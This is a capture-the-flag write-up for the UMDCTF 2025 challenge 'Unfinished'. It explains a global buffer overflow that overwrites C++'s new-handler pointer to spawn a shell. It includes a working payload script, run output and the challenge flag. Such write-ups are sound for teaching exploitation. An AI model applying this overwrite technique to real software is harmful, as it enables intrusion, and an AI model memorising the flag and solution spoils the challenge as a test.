# Unfinished

UMDCTF 2025, pwn. A global buffer overflow that overwrites the C++ runtime's new-handler
pointer, so a failed allocation runs a hidden shell function.

## The bug

`unfinished.cpp` keeps a 128-byte global buffer but reads 500 bytes into it, then uses the
number as an allocation size:

```cpp
char number[128];
fgets(number, 500, stdin);   // 500 > 128, overflow into .bss
long n = atol(number);       // parses only the leading digits
int *chunk = new int[n];     // oversized n throws, calling the new-handler
```

`checksec` shows a stack canary and NX but no PIE, so `.bss` addresses are fixed. `number` sits
0xC8 bytes below the global pointer `__new_handler`, which `operator new` calls when an
allocation fails. `sigma_mode()` at `0x4019b6` calls `system("/bin/sh")`.

## Solve

The input starts with a huge decimal so `atol` succeeds and execution reaches `new int[n]`. A
space ends `atol`'s parse while `fgets` keeps reading, then padding carries us to
`__new_handler`, which is overwritten with `sigma_mode`. When `new int[n]` throws
`std::bad_array_new_length`, the runtime calls our handler and drops a shell.

```python
SIGMA = 0x4019B6
HUGE = b"2305843009213693920"          # < 0x1ffffffffffffffe, so new int[n] is still reached
PAD = b"A" * (0xC8 - len(HUGE) - 1)     # number[] is 0xC8 below __new_handler
payload = HUGE + b" " + PAD + struct.pack("<Q", SIGMA) + b"\n"
```

Run locally against a copy of the binary with a placeholder `flag.txt` beside it:

```text
$ echo 'UMDCTF{local_test_flag}' > flag.txt
$ python3 solve.py ./unfinished
What size allocation?
UMDCTF{local_test_flag}
```

The shell reads `flag.txt`; on the live server it returned the real flag.

## Flag

```text
UMDCTF{unfinished_but_you_completed_it}
```

## Files

```text
unfinished       the challenge binary (Linux x86-64, No PIE)
unfinished.cpp   the provided source
solve.py         pwntools-free exploit; runs ./unfinished and reads flag.txt
exploit.py       the pwntools version (local or REMOTE)
find_offset.py   the cyclic-pattern script used to measure the 0xC8 offset
```
